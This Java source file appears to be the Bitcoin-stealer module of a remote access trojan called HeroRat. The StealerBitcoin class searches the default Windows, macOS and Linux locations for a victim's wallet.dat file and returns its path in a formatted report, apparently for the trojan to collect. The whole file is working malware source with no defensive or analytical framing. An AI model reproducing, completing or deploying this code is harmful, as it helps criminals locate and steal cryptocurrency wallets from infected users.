package net.herorat.features.stealer;

import java.io.File;

public class StealerBitcoin
{
	public static String getLogin()
	{
		try
		{
			String os = System.getProperty("os.name", "").toLowerCase();
			String home = System.getProperty("user.home", ".");
			
			File file = null;
			if (os.contains("win"))
			{
				file = new File(System.getenv("appdata"), "Bitcoin\\wallet.dat");
				if (System.getenv("appdata") == null) file = new File(home, "Bitcoin\\wallet.dat");
			}
			else if (os.contains("mac"))
			{
				file = new File("Library/Application Support/", "Bitcoin/wallet.dat");
			}
			else if (os.contains("nux"))
			{
				file = new File(home, ".bitcoin/wallet.dat");
			}
		
			if (file.exists())
			{
				StringBuffer buffer = new StringBuffer();
				buffer.append("---------- Bitcoin ----------\n");
				buffer.append("Wallet path: " + file.getAbsolutePath());
				buffer.append("\n-----------------------------\n\n");

				return buffer.toString();
			}
		}
		catch (Exception e) {}

		return "";
	}
}